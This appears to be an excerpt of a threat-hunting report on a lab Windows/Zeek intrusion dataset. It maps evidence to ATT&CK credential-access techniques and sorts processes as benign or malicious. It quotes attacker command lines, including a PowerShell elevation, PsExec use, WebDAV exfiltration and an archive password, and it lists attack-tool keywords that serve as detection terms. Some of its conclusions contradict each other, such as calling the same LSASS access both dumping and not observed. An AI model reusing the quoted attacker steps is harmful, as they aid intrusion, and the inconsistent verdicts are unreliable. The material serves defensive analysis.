Zeek conn records show only three source MACs (00:0d:3a:13:e3:69, 00:0d:3a:4d:42:f2, fc:bd:67:e1:a9:c1) and two responder MACs (12:34:56:78:9a:bc, 00:0d:3a:13:e3:69) plus broadcast. The dominant responder MAC 12:34:56:78:9a:bc is a well-known synthetic/placeholder address used in lab captures and is consistently paired with the internal hosts 10.0.0.4 and 10.0.1.6; no single MAC is seen claiming multiple unrelated IPs in a way that indicates gratuitous-ARP spoofing, and no duplicate-IP conflict or gateway MAC change appears. No PowerShell script block references arp or netsh interface manipulation. The only network anomalies are Zeek 'weird' events (ip_hdr_len_zero, truncated_IP, unknown_dce_rpc_auth_type) and two self-signed-certificate SSL notices, which are capture/validation artifacts rather than poisoning.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:45:00.056Z | simplerockbuild.simplerock.lan | zeek | zeek.resp_l2_addr | 12:34:56:78:9a:bc | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgR_H | q-3507cd29ee | ok |
| 2 | 2020-04-30 00:35:26.038Z | bobs.bigwheel.local | zeek | zeek.orig_l2_addr | fc:bd:67:e1:a9:c1 | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeByOkBkA | q-bf74fff4e2 | ok |
| 3 | 2020-04-30 00:35:26.037Z | bobs.bigwheel.local | zeek | zeek.name | truncated_IP | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeByNiUGc | q-f697cc3590 | ok |

### F46 · benign / medium · T1558.001 · No golden-ticket evidence: krbtgt TGS requests are ordinary TGT renewals, all tickets AES (0x12)

Evidence status: **verified**

All 28 event 4769 on newyork.dmevals.local have TicketEncryptionType 0x12 and Status 0x0. The two krbtgt service-ticket requests (03:04:04 by pbeesly@DMEVALS.LOCAL, 03:19:13/03:19:15 by SCRANTON$@DMEVALS.LOCAL) carry TicketOptions 0x60810010 (renewable/renew) and come from 10.0.1.4, i.e. normal TGT renewal traffic, not forged-ticket use. No 4672 special-privilege logons could be attributed to unusual principals (aggregation returned no buckets), no krbtgt/golden keywords in PowerShell script blocks, and no DC-side Kerberos events exist in windows.other. The LSASS access by PowerShell on scranton is credential dumping, but nothing shows a forged TGT being used.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.ServiceName | krbtgt | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy4FbJD | q-9381604e5b | ok |
| 2 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.TicketOptions | 0x60810010 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy4FbJD | q-9381604e5b | ok |
| 3 | 2020-05-02 03:19:13.000Z | newyork.dmevals.local | windows.security | win.ServiceName | krbtgt | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuw7KBe | q-9381604e5b | ok |
| 4 | 2020-05-02 03:19:13.000Z | newyork.dmevals.local | windows.security | win.TicketEncryptionType | 0x12 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuw7KBe | q-9381604e5b | ok |

### F47 · benign / medium · T1558.002 · No silver-ticket evidence: service tickets are machine-account TGS requests from 10.0.1.4/10.0.1.6

Evidence status: **verified**

The 4769 service tickets on newyork.dmevals.local target NEWYORK$, NASHUA$, SCRANTON$ and WEC$ and are requested by pbeesly@DMEVALS.LOCAL and SCRANTON$@DMEVALS.LOCAL from 10.0.1.4/10.0.1.6, all with Status 0x0 and AES encryption 0x12 — consistent with the observed WinRM/PSEXEC lateral movement, not with forged service tickets (which would not generate KDC 4769 events at all). No 'silver'/SPN tooling in PowerShell script blocks.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:14.000Z | newyork.dmevals.local | windows.security | win.ServiceName | WEC$ | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuv697k | q-9381604e5b | ok |
| 2 | 2020-05-02 03:19:14.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuv697k | q-9381604e5b | ok |
| 3 | 2020-05-02 03:19:14.000Z | newyork.dmevals.local | windows.security | user.name | SCRANTON$@DMEVALS.LOCAL | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuv697k | q-9381604e5b | ok |

### F48 · benign / medium · T1558.003 · No Kerberoasting: no RC4 service-ticket bursts or roasting tooling

Evidence status: **verified**

No 4769 event has TicketEncryptionType 0x17 (RC4) — all 28 are 0x12 — and there is no burst of service-ticket requests for user/service SPNs. PowerShell script blocks contain no Kerberoast/Invoke-Kerberoast/Rubeus strings (zero hits), and the zeek Kerberos capture (2020-04-30, non-overlapping window) shows only 14 AS and 11 TGS requests. The credential access seen on scranton/nashua targeted LSASS and certificate private keys, not Kerberos service tickets.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.TicketEncryptionType | 0x12 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8J3fS | q-9381604e5b | ok |
| 2 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.ServiceName | NEWYORK$ | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8J3fS | q-9381604e5b | ok |

### F49 · benign / medium · T1558.004 · No AS-REP roasting: no pre-auth-disabled account enumeration or GetNPUsers activity

Evidence status: **verified**

No PowerShell script block references AS-REP/asrep/GetNPUsers/DontRequirePreAuth (zero hits), and the security log contains no 4768/4771 Kerberos pre-authentication failure burst that would accompany AS-REP roasting. The only Kerberos activity is successful 4769 issuance on newyork.dmevals.local.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8J3fS | q-9381604e5b | ok |
| 2 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | user.name | pbeesly@DMEVALS.LOCAL | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8J3fS | q-9381604e5b | ok |

### F50 · benign / medium · T1606 · No forged web credential (cookie/SAML) activity observed; instead a full credential-access and exfiltration chain on scranton.dmevals.local

Evidence status: **verified**

Hunting for T1606 (forging web credentials) produced no evidence of cookie or SAML token forgery. The Zeek window (2020-04-30) does not overlap the Windows window (2020-05-02) and contains only ordinary ssl/http/kerberos log types with no saml/adfs/token URLs; no PowerShell 4104 script block mentions cookie, token, SAML, Assertion or NotOnOrAfter; no process command line references saml/token/cert; the only cookie-path file creation is a benign LocalService INetCookies path created by svchost.exe on scranton. The 5857/5858 WMI hits are routine RSOP_ExtensionStatus DeleteInstance operations by NT AUTHORITY\SYSTEM on newyork, and the 4624/4648 logon-process stack (Kerberos 217, Advapi 76, User32 2, NtLmSsp 1) shows no anomalous authentication package. However, the same host does show a genuine credential-access intrusion (see T1606.001/T1606.002 findings) that is better described by other techniques.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi-6ySm | q-09b8fda0d2 | ok |
| 2 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.other | message | Id = {C11E1664-7828-4AD0-B23A-0FCEF0EA26C0}; ClientMachine = NEWYORK; User = NT AUTHORITY\SYSTEM; ClientProcessId = 1588; Component = Unknown; Operation = Start… | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB0b | q-ccd9ebecd1 | ok |

### F53 · benign / medium · T1621 · No MFA/2FA request-generation activity observed; only WMI provider noise and unrelated hostui.exe execution

Evidence status: **verified**

Hunting for T1621 (Multi-Factor Authentication Request Generation) across the 2020-05-02 02:55-03:28Z Windows window found no MFA-fatigue indicators. The only hit (check C355, 85 events) is Windows Management Instrumentation noise: event 5858 'Start IWbemServices::DeleteInstance - Root\Rsop\Computer : RSOP_ExtensionStatus...' (48 on newyork.dmevals.local, 1 on scranton) and event 5857 WMI provider-start messages (e.g. 'CIMWin32 provider started with result code 0x0. HostProcess = wmiprvse.exe'), all under SYSTEM/NETWORK SERVICE/LOCAL SERVICE - routine RSOP/WMI provider lifecycle, not authentication. No 4625 failed logons exist in windows.security at all; the only authentication-adjacent events are 4648 explicit-credential logons by pbeesly from scranton.dmevals.local to NASHUA (10.0.1.6) and PSEXESVC.exe on nashua.dmevals.local, plus one successful 4776 (Status 0x0) for pbeesly on newyork - consistent with lateral movement tooling, not MFA push spam. No PowerShell script block or process command line in windows.powershell or windows.security 4688 contains mfa/2fa/authenticator/duo/okta/login strings. The only 'auth'-adjacent process is C:\Windows\System32\hostui.exe on scranton.dmevals.local, launched by pbeesly via 'Start-Process C:\Windows\System32\hostui.exe -verb runas' (PowerShell 4104, ScriptBlockId 07cee247-5933-49b5-a354-aa92f35c34c3) with a StartUp persistence shortcut hostui.lnk; this is a renamed/unsigned binary (Company/Description/OriginalFileName '-') but shows no MFA-prompt behaviour in the telemetry. Zeek data (2020-04-30) does not overlap the Windows window and contains no login/auth/mfa HTTP URLs. T1621 is therefore not observed in this data.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.other | message | Id = {C11E1664-7828-4AD0-B23A-0FCEF0EA26C0}; ClientMachine = NEWYORK; User = NT AUTHORITY\SYSTEM; ClientProcessId = 1588; Component = Unknown; Operation = Start… | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB0b | q-3a620dc8b0 | ok |
| 2 | 2020-05-02 03:01:30.000Z | newyork.dmevals.local | windows.other | message | CIMWin32 provider started with result code 0x0. HostProcess = wmiprvse.exe; ProcessID = 4292; ProviderPath = %systemroot%\system32\wbem\cimwin32.dll | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB0u | q-4efd1f73a8 | ok |
| 3 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | win.TargetServerName | NASHUA | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBunxq0T | q-756b0d3320 | ok |
| 4 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuTlU_q | q-756b0d3320 | ok |
| 5 | 2020-05-02 03:21:26.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Start-Process C:\Windows\System32\hostui.exe -verb runas | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByKWk9M | q-e5d7304951 | ok |
| 6 | 2020-05-02 03:21:27.276Z | scranton.dmevals.local | windows.sysmon | process.parent.command_line | powershell.exe  -c "Start-Process C:\Windows\System32\hostui.exe -verb runas" | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi30hQJ | q-c35380445b | ok |
| 7 | 2020-05-02 03:04:23.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoOSXoo | q-ead9b2f3a5 | ok |

### F55 · benign / medium · T1649 · Routine OS certificate-store maintenance by svchost/lsass/taskhostw and a single ROOT store blob update by Sysmon on nashua

Evidence status: **verified**

The remaining certificate-related registry hits are normal Windows certificate-store maintenance, not certificate theft or forging. Sysmon event 13 writes under HKLM\SOFTWARE\Microsoft\SystemCertificates were made by C:\windows\system32\svchost.exe (AuthRoot AutoUpdate DisallowedCertLastSyncTime and AuthRoot/Windows Live ID Token Issuer certificate blobs), C:\windows\system32\lsass.exe (AuthRoot certificate blob on nashua), C:\windows\system32\taskhostw.exe (per-user ACRS PhysicalStores settings on scranton) and C:\windows\System32\smss.exe (WOW6432Node SymbolicLinkValue). The single Security 4657 hit is a modification of the ROOT store value \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 (value 'Blob') on nashua.dmevals.local by NASHUA$ (S-1-5-18, logon 0x3E7) with process name C:\Windows\Sysmon.exe — a trusted-root store update consistent with normal certificate trust-list servicing, with no attacker tooling, no export and no private-key access. The 14 Kerberos 4768 TGT requests (pbeesly x9, SCRANTON$ x5) on newyork.dmevals.local are ordinary krbtgt ticket requests with no certificate/PKINIT indicators. Zeek x509 records (separate, non-overlapping 2020-04-30 window) contain only two self-signed subjects (rempel.group.net x376, conn.sons.info x2) on unrelated hosts, with no evidence of forged authentication certificates.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ObjectName | \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\BE36A4562FB2EE05DBB3D32323ADF445084ED656 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu4mRU | q-69e8bde70a | ok |
| 2 | 2020-05-02 03:16:19.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\Sysmon.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu4mRU | q-55ba9e985a | ok |
| 3 | 2020-05-02 02:59:37.453Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBogld9W | q-6ccd0b7d23 | ok |
| 4 | 2020-05-02 03:22:10.577Z | utica.dmevals.local | windows.sysmon | registry.path | HKLM\SOFTWARE\Microsoft\SystemCertificates\AuthRoot\AutoUpdate\DisallowedCertLastSyncTime | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi74TK0 | q-6ccd0b7d23 | ok |
| 5 | 2020-05-02 03:20:49.745Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\taskhostw.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnQMVqo | q-6ccd0b7d23 | ok |
| 6 | 2020-05-02 03:11:18.000Z | newyork.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuy-fsg | q-4ee958cad3 | ok |

### F44 · not_observed / medium · T1557.003 · No DHCP spoofing: no DHCP log source, no DHCP ports, no DHCP-related events

Evidence status: **verified**

There is no DHCP telemetry to indicate rogue DHCP activity. The windows.other System channel contains no DHCP client/server event codes (1341/1342/1020/1063 absent from the 216 events), and no PowerShell script block mentions DHCP. Sysmon event 3 destination ports contain no 67/68 traffic; the only broadcast traffic is normal NetBIOS name service (137) and datagram (138) to 10.0.1.255 from scranton, nashua and utica. The Zeek capture has no dhcp log type at all (only conn, files, ssl, x509, dce_rpc, http, dns, kerberos, dpd, smb_files, weird, smb_mapping, notice, pe), so DHCP spoofing is not observable in this data and nothing observed suggests it.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:22:30.169Z | utica.dmevals.local | windows.sysmon | destination.port | 137 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi63kXo | q-180859f170 | ok |
| 2 | 2020-05-02 03:20:31.412Z | nashua.dmevals.local | windows.sysmon | destination.port | 138 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnIEszs | q-180859f170 | ok |

## Pivot candidates

Processes the pivot reviewer had to assess (started by a script host or from outside the Windows directory, rare in the 15-minute windows around verified activity).

| Host | Executable | Starts | Parents | Assessment | Reason |
|---|---|---|---|---|---|
| nashua.dmevals.local | C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\S… | 1 | C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\S… | benign | Store Skype app restart; only a WerFault crash dump. |
| nashua.dmevals.local | C:\Windows\Temp\python.exe | 5 | C:\Windows\PSEXESVC.exe, C:\Windows\Temp\python.exe | malicious | PsExec-delivered PyInstaller payload that dropped Rar/sdelete and harvested credential files. |
| nashua.dmevals.local | C:\Windows\Temp\Rar.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Dropped archiver used to pack harvested credential files with password fGzq5yKw. |
| nashua.dmevals.local | C:\Windows\Temp\sdelete64.exe | 3 | C:\Windows\System32\cmd.exe | malicious | Dropped anti-forensics tool used to wipe Rar.exe and the archives. |
| nashua.dmevals.local | C:\WindowsAzure\Packages\CollectGuestLogs.exe | 1 | C:\WindowsAzure\Packages\WaAppAgent.exe | benign | Azure guest-agent diagnostics collector. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.… | 4 | C:\Windows\System32\cmd.exe, C:\Windows\System32\services.exe | benign | Azure Network Watcher extension. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\Antimalware… | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Azure antimalware extension config. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\bin\CustomScr… | 1 | C:\Windows\System32\cmd.exe | benign | Azure custom script extension handler. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Compute.JsonADDomainExtension\1.3.2\bin\JsonADDoma… | 1 | C:\Windows\System32\cmd.exe | benign | Azure domain-join extension. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler.exe | 2 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | benign | Google updater crash handler. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler64.exe | 2 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | benign | Google updater crash handler. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | 3 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe, C:\Windows\System32\servi… | benign | Google updater service. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\accessChk.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Run by pbeesly's PowerShell and wrote a passwordsDB file. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\PsExec64.exe | 4 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Used with plaintext password to run python.exe on NASHUA. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\sdelete64.exe | 3 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Wiped dropped payload and archives on scranton. |
| scranton.dmevals.local | C:\Program Files\Windows Defender\MsMpEng.exe | 1 | C:\Windows\System32\services.exe | benign | Defender service. |
| scranton.dmevals.local | C:\Program Files\Windows Defender\NisSrv.exe | 2 | C:\Windows\System32\services.exe | benign | Defender network inspection service. |
| scranton.dmevals.local | C:\ProgramData\victim\â€®cod.3aka3.scr | 1 | C:\Windows\explorer.exe | malicious | Oddly named screen saver in ProgramData\victim run by explorer, later sdelete-wiped. |
| scranton.dmevals.local | C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe | 2 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Compiled Add-Type payload DLLs for the hidden PowerShell loader. |
| scranton.dmevals.local | C:\Windows\System32\hostui.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | suspicious | Started by PowerShell with -verb runas elevation. |
| scranton.dmevals.local | C:\Windows\System32\sdclt.exe | 3 | C:\Windows\System32\cmd.exe | suspicious | Rapid launches from cmd.exe after HKCU Folder shell open command writes. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\BfeToolWin8.exe | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Azure guest agent firewall helper. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\FindVolume\FindVolume.exe | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Azure guest agent volume helper. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | 1 | C:\Windows\System32\services.exe | benign | Azure guest agent service. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe | 1 | C:\Windows\System32\services.exe | benign | Azure telemetry service. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\WaAppAgent.exe | 1 | C:\Windows\System32\services.exe | benign | Azure VM agent host. |
| scranton.dmevals.local | C:\WindowsAzure\SecAgent\WaSecAgentProv.exe | 2 | C:\WindowsAzure\Packages\WaAppAgent.exe | benign | Azure security agent provider. |
| scranton.dmevals.local | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPl… | 1 | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzure… | benign | Azure network agent plugin. |
| scranton.dmevals.local | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzure… | 1 | C:\Windows\System32\services.exe | benign | Azure network agent service. |

## Technique conclusions

One line per technique in scope: status from the triage of its family; `not_observed` = checked, nothing found; `not_observable` = no dataset records it.

| Technique | Status | Reason |
|---|---|---|
| T1003 OS Credential Dumping | not_observed | No dumping utility, dump file or hive export found. The pbeesly intrusion on scranton/nashua used Sysinternals, Get-PrivateKeys, screen capture and 7z/Rar exfil staging, none of which touch credential stores. |
| T1003.001 LSASS Memory | suspicious | PowerShell LSASS handle 0x1000, no dump file. |
| T1003.002 Security Account Manager | benign | All SAM_ALIAS/SAM_SERVER/SAM_DOMAIN handle requests are made by lsass.exe itself as SYSTEM (SCRANTON$); no reg save or SAM/SECURITY/SYSTEM hive file copies. |
| T1003.003 NTDS | not_observed | No ntds.dit file access, no vssadmin/diskshadow/ntdsutil command lines, and no shadow-copy or NTDS references in sysmon, security, powershell or windows.other. |
| T1003.004 LSA Secrets | not_observed | No lsadump/secrets command lines, no 4656/4663/4670 events on SECURITY Policy Secrets objects, and no LSA-secret references in PowerShell script blocks or windows.other messages. |
| T1003.005 Cached Domain Credentials | benign | HKLM\SECURITY\Cache\NL$1 writes on nashua are performed by lsass.exe itself (PID 728) as normal cached-credential maintenance; no external reader of the Cache key. |
| T1003.006 DCSync | benign | Only one 4662 on newyork by NEWYORK$ referencing DS-Replication GUIDs; no repeated Get-Changes/Get-Changes-All pattern and no drsuapi/lsadump/dcsync tooling. |
| T1040 Network Sniffing | benign | The only packet-capture activity observed is the signed Microsoft Azure Network Watcher agent on scranton.dmevals.local (Microsoft CoreXT, launched by services.exe/WindowsAzureGuestAgent.exe) running 'netsh trace start c… |
| T1056 Input Capture | malicious | pbeesly's PowerShell session on scranton ran Get-PrivateKeys (certificate/private-key export), accesschk, screen capture and 7-Zip exfil staging; a hidden-window PowerShell (PID 2976) loaded from monkey.png opened LSASS … |
| T1056.001 Keylogging | malicious | Get-Keystrokes job ran on scranton. |
| T1056.002 GUI Input Capture | malicious | Invoke-ScreenCapture on scranton.dmevals.local (PID 3852, job PID 3544) loops capturing the virtual screen to random .bmp files in the user's Downloads folder. |
| T1056.003 Web Portal Capture | not_observed | No wwwroot/inetpub/login file writes, no w3wp/IIS process activity, no 4663 access to web content paths; zeek window does not overlap and shows no HTTP POSTs. |
| T1056.004 Credential API Hooking | suspicious | Hidden, obfuscated PowerShell (PID 2976) requested full-access LSASS handles (0x1F3FFF, 0x1FFFFF) with an UNKNOWN call trace on scranton; no explicit hooking API or dump artefact observed, so intent is inferred. |
| T1110 Brute Force | not_observed | Zero 4625/4771/4740 events in windows.security; the single 4776 credential validation (newyork, pbeesly, Error Code 0x0) succeeded. No authentication-failure or lockout pattern. |
| T1110.001 Password Guessing | not_observed | No 4625 failures and no password-bearing process command lines; only unrelated 'failed' system messages (crash dump init, PTR registration) in windows.other. |
| T1110.002 Password Cracking | not_observed | LSASS accesses are svchost/Azure telemetry/wininit with GrantedAccess 0x1000, and SAM 4656 handles come from lsass.exe itself; no wordlists, potfiles, hash/crack command lines or ConvertTo-SecureString script blocks. Cer… |
| T1110.003 Password Spraying | not_observed | No 4625 burst and no user-list tooling; the 4648 events are pbeesly re-using its own credentials via PSEXESVC on nashua and svchost on scranton (lateral movement, not spraying). |
| T1110.004 Credential Stuffing | not_observed | No failed logons at all, so no replay of stolen credential pairs; credential-related messages are benign Credential Guard config and SAM remote-call restriction notices. |
| T1111 Multi-Factor Authentication Interception | not_observed | No MFA/smart-card/token interception artifacts. 4648 explicit-credential logons are pbeesly via PSEXESVC.exe/svchost.exe plus routine DWM-/UMFD-/machine accounts; the only type-10 logons are pbeesly from 172.18.39.2 (Neg… |
| T1187 Forced Authentication | malicious | WebDAV share used for exfil. |
| T1212 Exploitation for Credential Access | suspicious | Managed LSASS access, no protocol exploit. |
| T1539 Steal Web Session Cookie | not_observed | No browser cookie store access or theft. The only cookie-related events are benign: rundll32.exe davclnt.dll,DavSetCookie spawned by svchost.exe for the WebDAV share http://192.168.0.4/webdav on scranton.dmevals.local, a… |
| T1552 Unsecured Credentials | malicious | Credential-named files harvested on nashua. |
| T1552.001 Credentials In Files | malicious | passwordsDB written; plaintext password on PsExec command line. |
| T1552.002 Credentials in Registry | benign | All 17 Password/Credential registry value sets came from svchost.exe, lsass.exe, services.exe and winlogon.exe performing normal Windows/IdentityCRL/CredentialGuard/service operations. |
| T1552.003 Shell History | not_observed | No ConsoleHost_history access in Sysmon process creation or Security 4663/4656/4658 object access. |
| T1552.004 Private Keys | malicious | Private keys archived and sent to WebDAV. |
| T1552.006 Group Policy Preferences | suspicious | Two external hosts (10.0.1.4, 10.0.1.6) opened NEWYORK sysvol and read SecEdit\GptTmpl.inf on 2020-04-30; Windows-side GptTmpl.inf/gpt.ini writes are routine svchost Group Policy processing. |
| T1555 Credentials from Password Stores | malicious | Certificate private keys exported. |
| T1555.003 Credentials from Web Browsers | not_observed | No browser credential-store files, command lines, process handles or script text; only a .pfx certificate export and an unrelated INetCookies write were found. |
| T1555.004 Windows Credential Manager | malicious | LocalMachine certs exported to .pfx. |
| T1555.005 Password Managers | not_observed | Zero hits for KeePass/1Password/Bitwarden/LastPass/kdbx across sysmon, security, powershell and other channels. |
| T1556 Modify Authentication Process | malicious | Hidden PowerShell stager (bitmap-decoded IEX, HKLM Javasoft IEX, base64 -e child) plus reflective GetProcAddress/ReflectedDelegate loader on scranton; PowerShell.exe PID 2976 opened lsass with 0x1fffff and UNKNOWN call-t… |
| T1556.001 Domain Controller Authentication | suspicious | wsmprovhost.exe (WinRM, user pbeesly) on nashua opened lsass with 0x1f3fff and UNKNOWN frames, but no DC authentication/directory modification (no 5136/4739/4657) was observed. |
| T1556.002 Password Filter DLL | not_observed | No System32 DLL drops, no Notification Packages/Password registry changes, no PasswordFilter references; only benign Microsoft cryptdll/samlib/samcli loads. |
| T1556.005 Reversible Encryption | not_observed | No 4739 events and no Set-ADUser/dsmod/Reversible command lines or script blocks. |
| T1556.006 Multi-Factor Authentication | not_observed | No 4739/5136/4738 events or MFA-related command lines. |
| T1556.007 Hybrid Identity | benign | dsregcmd.exe runs as SYSTEM under svchost with template args on all hosts; no 5136 changes and no Connect-MsolService/Connect-AzureAD script blocks. |
| T1556.008 Network Provider DLL | not_observed | No 4657 NetworkProvider/Credential registry changes and no NetworkProvider/New-ItemProperty script blocks. |
| T1557 Adversary-in-the-Middle | not_observed | No interception evidence in any dataset; network logons are Kerberos with one NTLM logon, and the credential abuse seen (PsExec with plaintext password from scranton to NASHUA) is direct use, not AiTM. |
| T1557.001 Name Resolution Poisoning and SMB Relay | not_observed | SMB sessions go only to the DC NEWYORK.dmevals.local (IPC$/SYSVOL), DNS/LLMNR-style lookups are routine, and no poisoning or relay tooling appears in PowerShell or registry events. |
| T1557.002 ARP Cache Poisoning | not_observed | MAC-to-IP mappings are stable; the dominant responder MAC 12:34:56:78:9a:bc is a lab placeholder, and no MAC claims multiple IPs or gateway changes. |
| T1557.003 DHCP Spoofing | not_observable | No DHCP event codes in windows.other, no ports 67/68 in Sysmon, and no dhcp log type in Zeek; nothing observed suggests DHCP spoofing. |
